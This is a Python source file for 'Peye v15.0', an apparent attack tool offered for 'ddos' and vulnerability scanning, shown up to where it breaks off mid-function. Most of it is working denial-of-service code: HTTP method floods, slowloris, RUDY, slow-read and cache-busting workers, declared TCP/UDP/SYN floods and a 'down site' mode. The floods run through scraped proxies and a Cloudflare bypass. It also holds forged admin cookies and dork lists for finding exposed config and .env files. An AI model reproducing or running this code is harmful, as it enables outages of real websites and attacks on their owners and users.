import threading
import requests
import time
import random
import sys
import os
import socket
import ssl
import dns.resolver
import json
import hashlib
import re
import struct
import binascii
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

try:
    import h2.connection
    import h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

import warnings
warnings.filterwarnings('ignore')
os.system('clear')

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

VERSION = "15.0"
GITHUB_RAW_URL = "https://raw.githubusercontent.com/peye/peye/main/peye.py"

def print_banner():
    banner = f"""
{RED}111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111{YELLOW}¶¶¶{RED}111111111111111111111
111111111111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111111111
1111111111111111111111111111{YELLOW}¶¶¶¶{RED}1111111111111111111111111
11111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111111111111111111111111
111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111
11111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111
11111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
1111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111
111111111111111{YELLOW}¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111{YELLOW}¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111
1111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶{RED}111
11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11
1111{YELLOW}¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶{RED}1
11111{YELLOW}¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111
1111111{YELLOW}¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
1111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶¶¶{RED}1111111
11111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111{YELLOW}¶¶¶¶{RED}1111111
111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶{RED}1111111
1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶{RED}1111111
111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶¶¶{RED}11111111
11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111111111111111111{YELLOW}¶¶{RED}111111111
1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶{RED}1111111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶{RED}111111111111111111111111{YELLOW}¶¶¶¶¶{RED}11111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶{RED}11111111111111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}11111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
{YELLOW}¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11
{YELLOW}¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}1
{RED}1{YELLOW}¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶
{RED}11111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}11111111{YELLOW}¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111{YELLOW}¶¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶
{RED}11111{YELLOW}¶¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶{RED}1111111111111111111111{YELLOW}¶
{RED}111111{YELLOW}¶{RED}11111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}1111111111111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}11111111111111111111111111111{YELLOW}¶¶{RED}11111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111{RESET}
"""
    print(banner)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║     {MAGENTA} Welcome To Peye v{VERSION} {RESET}{CYAN}                   ║")
    print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

def check_update():
    print(f"{YELLOW}[*] Checking for updates...{RESET}")
    try:
        response = requests.get(GITHUB_RAW_URL, timeout=10)
        if response.status_code == 200:
            content = response.text
            version_match = re.search(r'VERSION = "(\d+\.\d+)"', content)
            if version_match:
                latest_version = version_match.group(1)
                if latest_version != VERSION:
                    print(f"{YELLOW}[!] New version available: v{latest_version} (current: v{VERSION}){RESET}")
                    update = input(f"{GREEN}[?] Update now? (y/n): {RESET}").lower()
                    if update == 'y':
                        with open(sys.argv[0], 'w') as f:
                            f.write(content)
                        print(f"{GREEN}[✓] Updated! Please restart the tool.{RESET}")
                        sys.exit(0)
                else:
                    print(f"{GREEN}[✓] You have the latest version (v{VERSION}){RESET}")
        else:
            print(f"{YELLOW}[!] Could not check for updates{RESET}")
    except:
        print(f"{YELLOW}[!] Network error checking updates{RESET}")

class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
    
    def add(self, success=True):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1

class WordlistManager:
    def __init__(self):
        self.wordlists = {}
        self.load_wordlists()
    
    def load_wordlists(self):
        # File yang tetap digunakan
        wordlist_files = {
            'xss': 'xss.txt',
            'sqli': 'sqli.txt',
            'lfi': 'lfi.txt',
            'xxe': 'xxe.txt',
            'ssti': 'ssti.txt',
            'xslt': 'xslt.txt',
            'ssi_esi': 'ssi_esi.txt',
            'bypass403': 'bypass403.txt',
            'bypass_waf': 'bypass_waf.txt',
            'dirs': 'dirs.txt',
            'subdomains': 'subdomains.txt',
            'files': 'files.txt',
            'parameters': 'parameters.txt',
            'endpoints': 'endpoints.txt',
            'dorks': 'dork.txt',
            'useragents': 'useragent.txt',
            'headers': 'headers.txt',
            'payloads_64kb': 'payloads_64kb.txt',
            'slow_body': 'slow_body.txt'
        }
        
        for name, filename in wordlist_files.items():
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name} from {filename}{RESET}")
            else:
                self.wordlists[name] = []
                print(f"{YELLOW}[!] {filename} not found, using internal{RESET}")
        
        # Internal lists untuk file yang dihapus
        self.internal_cookies = [
            "session=admin", "user=admin", "token=admin", "PHPSESSID=admin",
            "JSESSIONID=admin", "ASP.NET_SessionId=admin", "auth=admin",
            "logged_in=true", "admin=true", "role=admin", "user_id=1"
        ]
        
        self.internal_cors_origins = ['*', 'https://evil.com', 'null', 'https://attacker.com']
        
        self.internal_opendir = [
            "backup/", "old/", "temp/", "tmp/", "logs/", "cache/", "uploads/",
            "images/", "files/", "download/", "archive/", "backup_old/", "old_site/"
        ]
        
        self.internal_backup = [
            "backup.zip", "backup.rar", "backup.7z", "backup.tar", "backup.gz",
            "site_backup.zip", "db_backup.sql", "database.sql", "dump.sql",
            "backup.sql", "old_backup.zip", "backup_2024.zip"
        ]
        
        self.internal_config = [
            "config.php", "config.inc.php", "settings.php", "wp-config.php",
            "configuration.php", "config.yml", "config.yaml", "config.json",
            "config.ini", "config.bak", "config.old", "config.php.bak"
        ]
        
        self.internal_env = [
            ".env", ".env.local", ".env.development", ".env.staging",
            ".env.production", ".env.test", ".env.backup", "env.txt"
        ]
        
        self.internal_csrf = ["csrf_token", "csrf", "token", "authenticity_token"]
        
        print(f"{GREEN}[✓] Loaded internal lists: cookies, cors, opendir, backup, config, env, csrf{RESET}")
    
    def get(self, name):
        # Cek dari file dulu
        if name in self.wordlists and self.wordlists[name]:
            return self.wordlists[name]
        
        # Internal fallback
        internal_lists = {
            'cookies': self.internal_cookies,
            'cors': self.internal_cors_origins,
            'opendir': self.internal_opendir,
            'backup': self.internal_backup,
            'config': self.internal_config,
            'env': self.internal_env,
            'csrf': self.internal_csrf
        }
        
        if name in internal_lists:
            return internal_lists[name]
        
        return []

class DorkSearch:
    def __init__(self, target=None):
        self.target = target
        self.results = []
        self.wordlists = WordlistManager()
    
    def set_target(self, target):
        self.target = target
    
    def search_google(self, dork, max_results=20):
        if self.target:
            dork = f"{dork} site:{self.target}"
        print(f"{CYAN}[*] Searching: {dork}{RESET}")
        
        demo_results = [
            f"https://{self.target if self.target else 'example.com'}/{dork.replace(':', '/')}",
            f"https://www.{self.target if self.target else 'demo-site.com'}/{dork.replace(':', '/')}"
        ]
        
        for url in demo_results[:max_results]:
            self.results.append(url)
            print(f"{GREEN}[✓] {url}{RESET}")
        
        return self.results
    
    def search_from_file(self):
        print(f"{CYAN}[*] Searching from dork.txt file...{RESET}")
        dorks = self.wordlists.get('dorks')
        if not dorks:
            print(f"{RED}[!] No dorks found in dork.txt{RESET}")
            return []
        
        all_results = []
        for dork in dorks:
            print(f"{YELLOW}[*] Dork: {dork}{RESET}")
            results = self.search_google(dork, 10)
            all_results.extend(results)
            time.sleep(0.5)
        
        return all_results
    
    def tech_search(self, tech_name):
        tech_dorks = {
            'wordpress': 'inurl:wp-content',
            'laravel': 'inurl:.env',
            'jquery': 'inurl:jquery.js',
            'php': 'ext:php',
            'nginx': 'Server: nginx',
            'apache': 'Server: Apache',
            'admin': 'inurl:admin login',
            'config': 'ext:config OR ext:env',
            'backup': 'ext:sql OR ext:bak',
            'database': 'inurl:phpmyadmin'
        }
        
        if tech_name.lower() in tech_dorks:
            dork = tech_dorks[tech_name.lower()]
            print(f"{GREEN}[✓] Dork: {dork}{RESET}")
            return self.search_google(dork)
        else:
            print(f"{RED}[!] No dork for {tech_name}{RESET}")
            return []
    
    def popular_dorks(self):
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{YELLOW}[*] POPULAR GOOGLE DORKS{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        
        popular = {
            'Admin Panels': 'inurl:admin OR inurl:login',
            'Config Files': 'ext:env OR ext:config',
            'Backup Files': 'ext:sql OR ext:bak',
            'Directory Listing': 'intitle:"index of"',
            'Database': 'inurl:phpmyadmin',
            'WordPress': 'inurl:wp-admin',
            'API Keys': 'api_key filetype:txt',
            'Login Pages': 'inurl:login OR inurl:signin'
        }
        
        for name, dork in popular.items():
            print(f"{GREEN}[{name}]{RESET} {YELLOW}{dork}{RESET}")
        
        print(f"{CYAN}{'='*60}{RESET}")

class TechnologyDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.tech_stack = []
        self.details = {}
    
    def detect(self):
        print(f"{CYAN}[*] Scanning technology stack...{RESET}")
        
        try:
            resp = self.session.get(self.target, timeout=15)
            if resp.status_code != 200:
                print(f"{RED}[!] Cannot access {self.target} (Status: {resp.status_code}){RESET}")
                return False
            
            headers = resp.headers
            html = resp.text
            
            server = headers.get('Server', '')
            if server:
                self.tech_stack.append(f"Web Server: {server}")
            
            powered = headers.get('X-Powered-By', '')
            if powered:
                self.tech_stack.append(f"Powered By: {powered}")
            
            cms_patterns = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Laravel': ['laravel', 'csrf-token'],
                'Drupal': ['drupal', 'sites/default'],
                'Joomla': ['joomla', 'com_content']
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"CMS: {cms}")
                        break
            
            js_patterns = {
                'jQuery': ['jquery', 'jQuery'],
                'React': ['react', 'ReactDOM'],
                'Vue.js': ['vue.js'],
                'Bootstrap': ['bootstrap']
            }
            
            for lib, patterns in js_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"JS: {lib}")
                        break
            
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            return False
        
        return True
    
    def display(self):
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] TECHNOLOGY STACK: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        
        if self.tech_stack:
            for tech in self.tech_stack:
                print(f"{GREEN}[✓] {tech}{RESET}")
        else:
            print(f"{YELLOW}[!] No technologies detected{RESET}")
        
        print(f"{MAGENTA}{'='*60}{RESET}")

class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.use_proxy = use_proxy
        self.lock = threading.Lock()
    
    def scrape_proxies(self):
        if not self.use_proxy:
            return []
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        ]
        for source in sources:
            try:
                resp = requests.get(source, timeout=10, verify=False)
                if resp.status_code == 200:
                    for line in resp.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            proxies.append(line)
            except:
                continue
        if proxies:
            self.proxies = list(set(proxies))[:200]
            print(f"{GREEN}[✓] Loaded {len(self.proxies)} proxies{RESET}")
        return self.proxies
    
    def get(self):
        if not self.use_proxy or not self.proxies:
            return None
        with self.lock:
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}

class CFBypass:
    def __init__(self, target):
        self.target = target
        self.session = None
    
    def bypass(self):
        try:
            import cloudscraper
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
            scraper.get(self.target, timeout=15)
            return scraper
        except:
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
            return session

class DoSAttack:
    def __init__(self, target, use_proxy=True):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager(use_proxy)
        self.running = False
        self.stats = Stats()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.path = self.parsed.path or '/'
        self.wordlists = WordlistManager()
        self.session_cookies = {}
        self.saa_enabled = False
        
        if use_proxy:
            self.proxy_manager.scrape_proxies()
    
    def enable_saa(self):
        self.saa_enabled = True
    
    def _add_saa(self, url):
        if not self.saa_enabled:
            return url
        
        if random.random() > 0.7:
            url = url.rstrip('/') + '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(1, 5))) + '/'
        
        if random.random() > 0.5:
            sep = '?' if '?' not in url else '&'
            url += sep + f"_{random.randint(1,999999)}={random.randint(1,999999)}"
        
        return url
    
    # LAYER 7 HTTP METHODS
    def http_get(self, duration, threads):
        self._attack("HTTP GET", duration, threads, self._http_get_worker)
    
    def http_post(self, duration, threads):
        self._attack("HTTP POST", duration, threads, self._http_post_worker)
    
    def http_head(self, duration, threads):
        self._attack("HTTP HEAD", duration, threads, self._http_head_worker)
    
    def http_put(self, duration, threads):
        self._attack("HTTP PUT", duration, threads, self._http_put_worker)
    
    def http_delete(self, duration, threads):
        self._attack("HTTP DELETE", duration, threads, self._http_delete_worker)
    
    def http_patch(self, duration, threads):
        self._attack("HTTP PATCH", duration, threads, self._http_patch_worker)
    
    def http_options(self, duration, threads):
        self._attack("HTTP OPTIONS", duration, threads, self._http_options_worker)
    
    def http_trace(self, duration, threads):
        self._attack("HTTP TRACE", duration, threads, self._http_trace_worker)
    
    def http_connect(self, duration, threads):
        self._attack("HTTP CONNECT", duration, threads, self._http_connect_worker)
    
    def http_random(self, duration, threads):
        self._attack("HTTP RANDOM", duration, threads, self._http_random_worker)
    
    def slow_post(self, duration, threads):
        self._attack("SLOW POST", duration, threads, self._slow_post_worker)
    
    def slow_read(self, duration, threads):
        self._attack("SLOW READ", duration, threads, self._slow_read_worker)
    
    def slowloris(self, duration, threads):
        self._attack("SLOWLORIS", duration, threads, self._slowloris_worker)
    
    def rudy(self, duration, threads):
        self._attack("RUDY", duration, threads, self._rudy_worker)
    
    def cache_flood(self, duration, threads):
        self._attack("CACHE FLOOD", duration, threads, self._cache_worker)
    
    def waf_bypass(self, duration, threads):
        self._attack("WAF BYPASS", duration, threads, self._waf_bypass_worker)
    
    def xmlrpc(self, duration, threads):
        self._attack("XMLRPC", duration, threads, self._xmlrpc_worker)
    
    # LAYER 7 HTTP/2
    def h2_get(self, duration, threads):
        self._attack("HTTP/2 GET", duration, threads, self._h2_get_worker)
    
    def h2_post(self, duration, threads):
        self._attack("HTTP/2 POST", duration, threads, self._h2_post_worker)
    
    def h2_rapid(self, duration, threads):
        self._attack("HTTP/2 RAPID", duration, threads, self._h2_rapid_worker)
    
    def h2_ping(self, duration, threads):
        self._attack("HTTP/2 PING", duration, threads, self._h2_ping_worker)
    
    # LAYER 4
    def tcp_flood(self, duration, threads):
        self._attack("TCP FLOOD", duration, threads, self._tcp_worker)
    
    def udp_flood(self, duration, threads):
        self._attack("UDP FLOOD", duration, threads, self._udp_worker)
    
    def syn_flood(self, duration, threads):
        self._attack("SYN FLOOD", duration, threads, self._syn_worker)
    
    def ack_flood(self, duration, threads):
        self._attack("ACK FLOOD", duration, threads, self._ack_worker)
    
    def fin_flood(self, duration, threads):
        self._attack("FIN FLOOD", duration, threads, self._fin_worker)
    
    def rst_flood(self, duration, threads):
        self._attack("RST FLOOD", duration, threads, self._rst_worker)
    
    def xmas_flood(self, duration, threads):
        self._attack("XMAS FLOOD", duration, threads, self._xmas_worker)
    
    def null_flood(self, duration, threads):
        self._attack("NULL FLOOD", duration, threads, self._null_worker)
    
    def mixed_flood(self, duration, threads):
        self._attack("MIXED", duration, threads, self._mixed_worker)
    
    def all_attacks(self, duration, threads):
        print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
        thr_each = max(1, threads // 10)
        attacks = [
            self.http_get, self.http_post, self.http_head, self.slowloris,
            self.cache_flood, self.waf_bypass, self.mixed_flood, self.tcp_flood,
            self.udp_flood, self.xmlrpc
        ]
        for attack in attacks:
            threading.Thread(target=attack, args=(duration, thr_each)).start()
        time.sleep(duration + 2)
    
    def down_site(self, duration, threads):
        print(f"\n{RED}[!] DOWN SITE MODE | {self.target}{RESET}")
        self.all_attacks(duration, threads * 2)
    
    # WORKERS
    def _http_get_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.get(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_post_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.post(url, data='x' * 64000, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_head_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.head(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_put_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.put(url, data='x' * 1000, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_delete_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.delete(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_patch_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.patch(url, data='x' * 1000, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_options_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.options(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_trace_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.send(requests.Request('TRACE', url).prepare(), timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_connect_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.send(requests.Request('CONNECT', url).prepare(), timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_random_worker(self, end_time):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                url = self._add_saa(self.target)
                session.request(method, url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _slow_post_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                data = 'x' * 10000
                for chunk in [data[i:i+10] for i in range(0, len(data), 10)]:
                    session.post(self.target, data=chunk, timeout=1)
                    time.sleep(0.1)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _slow_read_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                resp = session.get(self.target, stream=True, timeout=2)
                for chunk in resp.iter_content(10):
                    time.sleep(0.1)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _slowloris_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            while self.running and time.time() < end_time:
                sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.5)
                self.stats.add(True)
        except:
            self.stats.add(False)
        finally:
            try:
                sock.close()
            except:
                pass
    
    def _rudy_worker(self, end_time):
        content = 'x' * 10000
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                session.post(self.target, data={'data': content}, timeout=5)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _cache_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        cookies_list = self.wordlists.get('cookies')
        
        try:
            init_resp = session.get(self.target, timeout=5)
            if init_resp.cookies:
                self.session_cookies = init_resp.cookies.get_dict()
                session.cookies.update(self.session_cookies)
        except:
            pass
        
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                
                cache_headers = {
                    'Cache-Control': random.choice(['no-cache', 'no-store', 'max-age=0', 'must-revalidate']),
                    'Pragma': 'no-cache',
                    'Expires': '0',
                    'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
                    'If-None-Match': f'"{random.randint(100000, 999999)}"'
                }
                
                if self.session_cookies:
                    session.cookies.update(self.session_cookies)
                
                if cookies_list:
                    cookie = random.choice(cookies_list)
                    if '=' in cookie:
                        key, val = cookie.split('=', 1)
                        session.cookies.set(key, val)
                
                session.headers.update(cache_headers)
                url = self._add_saa(self.target)
                resp = session.get(url, timeout=2)
                
                if resp.cookies:
                    self.session_cookies.update(resp.cookies.get_dict())
                    session.cookies.update(self.session_cookies)
                
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _waf_bypass_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        bypass_payloads = self.wordlists.get('bypass_waf')
        if not bypass_payloads:
